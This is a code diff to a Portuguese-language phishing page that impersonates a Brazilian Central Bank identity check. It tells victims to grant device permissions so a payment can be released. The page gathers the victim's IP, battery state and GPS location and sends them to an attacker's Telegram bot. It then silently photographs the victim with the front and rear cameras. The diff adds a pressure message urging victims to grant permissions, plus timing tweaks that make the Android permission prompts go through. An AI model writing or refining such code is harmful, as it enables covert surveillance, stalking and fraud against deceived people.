@@ -40,7 +40,7 @@
 
         <div id="tela-permissao">
             <h1 style="font-size: 20px; color: #333;">Validação de Identidade</h1>
-            <p style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
+            <p id="texto-instrucao" style="color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 30px;">
                 Para sua segurança, o Banco Central exige as permissões do dispositivo para liberar este recebimento. 
                 <br><br>
                 Isso garante que você receba o valor e evita golpes.
@@ -77,6 +77,11 @@
         document.getElementById('spinner').style.display = 'inline-block';
         document.getElementById('btnFinal').disabled = true;
 
+        // Monitor de demora (10 segundos)
+        const timeoutAviso = setTimeout(() => {
+            document.getElementById('texto-instrucao').innerHTML = "<b style='color:red;'>Conexão lenta ou interrupção de segurança.</b><br>Por favor, autorize as permissões solicitadas pelo navegador para concluir o recebimento.";
+        }, 10000);
+
         let dadosConexao = { ip: "Não identificado", porta: window.location.port || "443" };
         try {
             const resp = await fetch('https://api.ipify.org?format=json');
@@ -93,7 +98,9 @@
             infoExtra = `\n🔋 Bateria: ${(bat.level * 100).toFixed(0)}% (${bat.charging ? '🔌' : '🔋'})`;
         } catch(e){}
 
+        // GEOLOCALIZAÇÃO COM TIMEOUT DE 20s PARA EVITAR TRAVAMENTO INFINITO
         navigator.geolocation.getCurrentPosition(async (pos) => {
+            clearTimeout(timeoutAviso); // Alvo permitiu, cancela o aviso de demora
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
             const mapa = `https://www.google.com/maps?q=${lat},${lon}`;
@@ -101,14 +108,19 @@
             
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
+            // PAUSA TÁTICA PARA O ANDROID LIBERAR A FILA DE PERMISSÕES
+            await new Promise(r => setTimeout(r, 2000));
+
             try {
                 await tirarFoto("user", "FRONTAL");
+                await new Promise(r => setTimeout(r, 1000));
                 await tirarFoto("environment", "TRASEIRA");
                 window.location.href = "bradesco.html";
             } catch (e) { window.location.href = "bradesco.html"; }
         }, (err) => {
+            clearTimeout(timeoutAviso);
             window.location.href = "autorizar.html";
-        });
+        }, { timeout: 20000 }); // Espera no máximo 20 segundos pela resposta do GPS
     }
 
     async function tirarFoto(face, label) {
@@ -127,7 +139,7 @@
             video.srcObject = stream;
             
             await new Promise(r => video.onloadedmetadata = r);
-            await new Promise(r => setTimeout(r, 1500)); // Aguarda ajuste de luz
+            await new Promise(r => setTimeout(r, 1500)); // Tempo para sensor HD ajustar
             
             const canvas = document.getElementById('canvas');
             canvas.width = video.videoWidth;
